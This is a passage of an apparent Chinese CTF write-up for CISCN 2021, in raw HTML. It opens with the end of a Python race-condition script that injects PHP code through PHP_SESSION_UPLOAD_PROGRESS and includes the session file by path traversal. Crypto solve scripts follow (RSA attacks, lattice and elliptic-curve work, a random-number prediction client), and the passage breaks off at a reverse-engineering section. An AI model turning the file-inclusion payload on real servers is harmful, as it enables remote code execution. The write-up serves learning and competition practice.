class="line">        url&#x3D;&#39;http:&#x2F;&#x2F;121.36.14.168:24395&#x2F;&#39;,</span><br><span class="line">        cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessid&#125;,</span><br><span class="line">        data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;5&#39; * 40 + &#39;&lt;?php var_dump(scandir(&quot;&#x2F;etc&#x2F;haffdebchd&#x2F;cfdidaddda&#x2F;afjacficij&#x2F;ggahijaeee&#x2F;bjcbcedaji&#x2F;fl444444g&quot;));?&gt;&#39;&#125;,</span><br><span class="line">        files&#x3D;&#123;&#39;file&#39;: (&#39;a.txt&#39;, f)&#125;,</span><br><span class="line">)</span><br><span class="line">def t2(session):</span><br><span class="line">    while True:</span><br><span class="line">        data &#x3D;&#123;</span><br><span class="line">            &#39;cf&#39;: &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;dhccbdgecg&#x2F;sess_test&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;&quot;http:&#x2F;&#x2F;121.36.14.168:24395&#x2F;&quot;, data&#x3D;data)</span><br><span class="line">        print(response.text)</span><br><span class="line">        if &#39;string&#39; in response.text:</span><br><span class="line">            break</span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">t1 &#x3D; threading.Thread(target&#x3D;t1, args&#x3D;(session,))</span><br><span class="line">t1.daemon &#x3D; True</span><br><span class="line">t1.start()</span><br><span class="line">t2(session)</span><br></pre></td></tr></table></figure><p>正好套了五层……</p><blockquote><p>CISCN{5azpA-eCNJC-ctcXm-vJzDU-jXPBS-}</p></blockquote><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>首先根据题意$$ex-yn=y(p+q+1)-z$$</p><p>那么可以造出格子求出$$x,y$$</p><p>再二分法求$$s=p+q$$</p><p>与虎符杯密码第二题类似，参照该题解出。<a href="https://tearsjin.xyz/page/2/?fileGuid=cKDQRHCPv6VjxWKx">https://tearsjin.xyz/page/2/</a></p><p>有题意，$$a=0$$,带点可求$$b$$</p><p>求$$e在阶下的逆元$$</p><p>求$$G=dP$$</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">n&#x3D;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span><br><span class="line">half_n&#x3D;int(sqrt(n))</span><br><span class="line">e&#x3D;67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span><br><span class="line">M&#x3D;matrix([[half_n,e],</span><br><span class="line">[0,-n]])</span><br><span class="line">L&#x3D;M.LLL()[0]</span><br><span class="line">mm&#x3D;matrix([-235436912945336662391026124471105219395770217328162018931594609419582745114251948238840212881814533708592325776478635076056630520429862826686225762483017735282225173655229129488512828712599656980161312082481987496707036067942329100,-406850608655407486298019095013146348847805975120061760929682791882948049742096195978800022454159691659865169100330308708576847735609146508679126419372034710027124703842712262177437006326228856546452636094881051757653949488135598409])</span><br><span class="line">bound&#x3D;int(sqrt(2*n))&#x2F;&#x2F;12</span><br><span class="line">x,y&#x3D;26279444166664821795077701675621823220865336004430428203703688888211697122228,22131877391133483964429946329193825460775374851078084751208971056041193500203</span><br><span class="line">assert x&lt;bound</span><br><span class="line">assert y&lt;bound&#x2F;&#x2F;x</span><br><span class="line">def magic(K,N):</span><br><span class="line">l &#x3D; 0</span><br><span class="line">r &#x3D; K</span><br><span class="line">for i in range(515):</span><br><span class="line">s &#x3D; (l+r)&#x2F;&#x2F;2</span><br><span class="line">v &#x3D; s*s-int(9*s^2*(K-1-s)*(K-1-s))&#x2F;&#x2F;(round(N^0.25)*round(N^0.25))</span><br><span class="line">if v&lt;4*N:</span><br><span class="line">l&#x3D;s</span><br><span class="line">else:</span><br><span class="line">r&#x3D;s</span><br><span class="line">return r</span><br><span class="line">e&#x3D;67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span><br><span class="line">x,y&#x3D;26279444166664821795077701675621823220865336004430428203703688888211697122228,22131877391133483964429946329193825460775374851078084751208971056041193500203</span><br><span class="line">n&#x3D;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span><br><span class="line">k&#x3D;e*x-y*n</span><br><span class="line">K&#x3D;k&#x2F;&#x2F;y</span><br><span class="line">s&#x3D;magic(K,n)</span><br><span class="line">print(s)</span><br><span class="line">from z3 import *</span><br><span class="line">s&#x3D;Solver()</span><br><span class="line">p,q&#x3D;Ints(&quot;p q&quot;)</span><br><span class="line">s.add(p+q&#x3D;&#x3D;18383013852155207284866834850624501649134164688503883162216824258842790032992437383933186349369945088653252318167911285710266631681220716855493349532603970)</span><br><span class="line">s.add(p*q&#x3D;&#x3D;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281)</span><br><span class="line">if s.check()&#x3D;&#x3D;sat:</span><br><span class="line">print(s.model())</span><br><span class="line">a&#x3D;0</span><br><span class="line">b&#x3D;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421103469394495274706241578726021598690355239783781433785479293793926265140251884444575671410967573946453503486277025286699273827984004452338</span><br><span class="line">e &#x3D; 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span><br><span class="line">p&#x3D;7137110102022535123348664656689848983548191256934755709215236325084864398993149288243244941561397379979025441681860286823605147363784020425000696750337273</span><br><span class="line">q&#x3D;11245903750132672161518170193934652665585973431569127453001587933757925633999288095689941407808547708674226876486050998886661484317436696430492652782266697</span><br><span class="line">phi&#x3D;(p+1)*(q+1)</span><br><span class="line">x,y&#x3D;6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605, 38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span><br><span class="line">d&#x3D;inverse_mod(e,phi)</span><br><span class="line">C&#x3D;E([x,y])</span><br><span class="line">G&#x3D;d*C</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">print(long_to_bytes(G[0])+long_to_bytes(G[1]))</span><br><span class="line">#CISCN&#123;e91fef4ead7463b13d00bda65f540477&#125;</span><br></pre></td></tr></table></figure><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>送分题，低指数爆破，共模攻击，已知高位攻击，求出明文拼接后求md5.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">#共模</span><br><span class="line">e1 &#x3D; 17</span><br><span class="line">e2 &#x3D;65537</span><br><span class="line">n &#x3D;111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span><br><span class="line">c1 &#x3D;54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br><span class="line">c2 &#x3D;91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br><span class="line">_, r, s &#x3D; gmpy2.gcdext(e1, e2)</span><br><span class="line">m &#x3D; pow(c1, r, n) * pow(c2, s, n) % n</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">#爆破</span><br><span class="line">n&#x3D;</span><br><span class="line">e&#x3D;3</span><br><span class="line">c&#x3D;</span><br><span class="line">k&#x3D;0</span><br><span class="line">while True:</span><br><span class="line">      a&#x3D;iroot(c+k*n,3)</span><br><span class="line">      if a[1]:</span><br><span class="line">          print(long_to_bytes(a[0]))</span><br><span class="line">#高位</span><br><span class="line">n &#x3D;</span><br><span class="line">e &#x3D;</span><br><span class="line">c &#x3D;</span><br><span class="line">pbar &#x3D;</span><br><span class="line">kbits &#x3D;</span><br><span class="line">print(&quot;upper %d bits (of %d bits) is given&quot; % (pbar.nbits()-kbits, pbar.nbits()))</span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; x + pbar</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.4)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.4</span><br><span class="line">p &#x3D; x0 + pbar</span><br><span class="line">print(&quot;p:&quot;, p)</span><br><span class="line">q &#x3D; n &#x2F;&#x2F; int(p)</span><br><span class="line">d &#x3D; inverse_mod(e, (p-1)*(q-1))</span><br><span class="line">print(&quot;m:&quot;, pow(c, d, n))</span><br><span class="line">      </span><br></pre></td></tr></table></figure><h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p>首先根据test数据可以求到key的四种可能性，由于有些元素求反导致，所以只需要将四个密钥两两组合爆破，根据加密代倒推ch，ch倒推seq，进而求x,r,爆破x0最终可以得到各个参数分别为：r=1.2</p><p>key1=169</p><p>key2=78</p><p>x0=0.840264</p><p>再解出image即可，需要注意的是，这里是py2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">testcipher&#x3D;[131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174]</span><br><span class="line">testimage&#x3D;[205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31]</span><br><span class="line">pos_key1&#x3D;[x^y for x,y in zip(testcipher,testimage)]</span><br><span class="line">print(pos_key1)</span><br><span class="line">keys&#x3D;[]</span><br><span class="line">for i in pos_key1:</span><br><span class="line">    if i not in keys:</span><br><span class="line">        keys.append(i)</span><br><span class="line">print(keys)</span><br><span class="line">key1&#x3D;169</span><br><span class="line">key2&#x3D;78</span><br><span class="line">ch&#x3D;&quot;&quot;</span><br><span class="line">for i in range(len(testimage)):</span><br><span class="line">    if (testimage[i]^key1&#x3D;&#x3D;testcipher[i]):</span><br><span class="line">        ch+&#x3D;&quot;0&quot;</span><br><span class="line">        </span><br><span class="line">    if (~testimage[i]^key1&#x3D;&#x3D;testcipher[i]):</span><br><span class="line">        ch+&#x3D;&quot;1&quot;</span><br><span class="line">        </span><br><span class="line">    if (testimage[i]^key2&#x3D;&#x3D;testcipher[i]):</span><br><span class="line">        ch+&#x3D;&quot;2&quot;</span><br><span class="line">        </span><br><span class="line">    if (~testimage[i]^key2&#x3D;&#x3D;testcipher[i]):</span><br><span class="line">        ch+&#x3D;&quot;3&quot;</span><br><span class="line">        </span><br><span class="line">num&#x3D;16*16&#x2F;&#x2F;8</span><br><span class="line">seq&#x3D;[]</span><br><span class="line">for i in range(len(ch)):</span><br><span class="line">    seq.append(bin(int(ch[i]))[2:].zfill(2))</span><br><span class="line">print(seq)</span><br><span class="line">seqs&#x3D;[]</span><br><span class="line">for i in seq:</span><br><span class="line">    seqs.append(float(i)&#x2F;22000)</span><br><span class="line">tmps&#x3D;[round(seq&#x2F;22000,6) for seq in seqs]</span><br><span class="line">#solve the x[0] and x0</span><br><span class="line">v&#x3D;round(tmps[0],6)</span><br><span class="line">for i in range(1000):</span><br><span class="line">    tmpv&#x3D;v-1000*0.000001+i*0.000001</span><br><span class="line">    Flag&#x3D;True</span><br><span class="line">    for j in range(0,len(seqs)):</span><br><span class="line">        </span><br><span class="line">        if int(seqs[j]!&#x3D;int(tmpv*22000)):</span><br><span class="line">            #print(seqs[j],int(tmpv*22000))</span><br><span class="line">            Flag&#x3D;False</span><br><span class="line">        tmpv&#x3D;generate(tmpv,r)</span><br><span class="line">    if Flag:</span><br><span class="line">        print(&quot;found x[0]:&quot;+str(v-1000*0.000001+i*0.000001))</span><br><span class="line">def generate(x):</span><br><span class="line">    return round(r*x*(3-x),6)</span><br><span class="line">c&#x3D;[198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]</span><br><span class="line">r&#x3D;1.2</span><br><span class="line">key1&#x3D;169</span><br><span class="line">key2&#x3D;78</span><br><span class="line">x0&#x3D;0.840264</span><br><span class="line">m&#x3D;24</span><br><span class="line">n&#x3D;16</span><br><span class="line">def decrypt(c,key1,key2,x0,m,n):</span><br><span class="line">    flag&#x3D;[]</span><br><span class="line">    num &#x3D; m*n&#x2F;&#x2F;8    </span><br><span class="line">    seqs &#x3D; []</span><br><span class="line">    x &#x3D; x0</span><br><span class="line">    bins &#x3D; &#39;&#39;</span><br><span class="line">    tmp &#x3D; []</span><br><span class="line">    for i in range(num):</span><br><span class="line">        x &#x3D; generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(int(x*22000))</span><br><span class="line">    for x in seqs:</span><br><span class="line">        bin_x  &#x3D; bin(x)[2:]</span><br><span class="line">        if len(bin_x) &lt; 16:</span><br><span class="line">            bin_x &#x3D; &#39;0&#39;*(16-len(bin_x))+bin_x</span><br><span class="line">        bins +&#x3D; bin_x</span><br><span class="line">    for i in range(m):</span><br><span class="line">        for j in range(n):</span><br><span class="line">            index&#x3D;n*i+j</span><br><span class="line">            ch&#x3D;int(bins[2*index:2*index+2],2)</span><br><span class="line">            cip&#x3D;c[index]</span><br><span class="line">            if ch&#x3D;&#x3D;0:</span><br><span class="line">                flag.append(cip^key1)</span><br><span class="line">            if ch&#x3D;&#x3D;1:</span><br><span class="line">                flag.append(~cip^key1)&amp;0xff</span><br><span class="line">            if ch&#x3D;&#x3D;2:</span><br><span class="line">                flag.append(cip^key2)</span><br><span class="line">            if ch&#x3D;&#x3D;3:</span><br><span class="line">                flag.append(~cip^key2)&amp;0xff</span><br><span class="line">    return flag</span><br><span class="line">flag&#x3D;decrypt(c,key1,key2,x0,m,n)</span><br><span class="line">import hashlib</span><br><span class="line">msg&#x3D;hashlib.md5((&#39;&#39;.join(map(chr,flag))).encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">print(&quot;CSCIN&#123;&quot;+msg+&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure><h2 id="homo"><a href="#homo" class="headerlink" title="homo"></a>homo</h2><p>首先是预测随机数也就是破解random，可以直接采用现成的工具，然后通过随机数就可以进入解密，要求输入c0,c1但不能与a,b相同，半蒙半猜的搞出下面的东西，大概就是不要和a,b相同却要a,b相同的作用，那么取最近的试试，还真出了。、？！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import randcrack</span><br><span class="line">import random</span><br><span class="line">from copy import deepcopy</span><br><span class="line">from pwn import *</span><br><span class="line">rc &#x3D; randcrack.RandCrack()</span><br><span class="line">p&#x3D;remote(&quot;121.36.14.168&quot;,24303)</span><br><span class="line">context.log_level&#x3D;&quot;debug&quot;</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">c_0&#x3D;eval(p.recvuntil(&quot;\n&quot;))</span><br><span class="line">c_1&#x3D;eval(p.recvuntil(&quot;\n&quot;))</span><br><span class="line">my_c0&#x3D;deepcopy(c_0)</span><br><span class="line">my_c0[0]-&#x3D;1</span><br><span class="line">my_c1&#x3D;deepcopy(c_1)</span><br><span class="line">my_c1[0]+&#x3D;1</span><br><span class="line">p.recvuntil(&quot;2.decrypt&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">mask &#x3D; (1 &lt;&lt; 32) - 1</span><br><span class="line">for _ in range(312):</span><br><span class="line">    p.recvuntil(&quot;your number:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;lose!my number is &quot;)</span><br><span class="line">    r&#x3D;int(p.recvuntil(&quot;\n&quot;).decode().strip(&quot;\n&quot;))</span><br><span class="line">    k&#x3D;r&gt;&gt;32</span><br><span class="line">    w&#x3D;r&amp;mask</span><br><span class="line">    rc.submit(k)</span><br><span class="line">    rc.submit(w)</span><br><span class="line">    </span><br><span class="line">for _ in range(200):</span><br><span class="line">    p.recvuntil(&quot;your number:&quot;)</span><br><span class="line">    m&#x3D;rc.predict_randrange(0, 2 ** 64 - 1)</span><br><span class="line">    p.sendline(str(m))</span><br><span class="line">    </span><br><span class="line">p.sendline(&quot;2&quot;)   </span><br><span class="line">p.recvuntil(&quot;c0:&quot;)</span><br><span class="line">p.sendline(&quot;,&quot;.join(str(x) for x in my_c0))</span><br><span class="line">p.recvuntil(&quot;c1:&quot;)</span><br><span class="line">p.sendline(&quot;,&quot;.join(str(x) for x in my_c1))</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">p.recvuntil(&quot;\n&quot;)</span><br><span class="line">#解01串，CISCN&#123;kyVjZ-M47XA-jfGgg-XaK2J-R07QH-&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h2><p>在jd-jui中查看主函数</p><p><img src="/2021/05/16/CISCN2021/6.PNG"></p><p>然后在ida里查看so文件</p><p><img src="/2021/05/16/CISCN2021/7.PNG"></p><p><img src="/2021/05/16/CISCN2021/8.PNG"></p><p>解题脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int 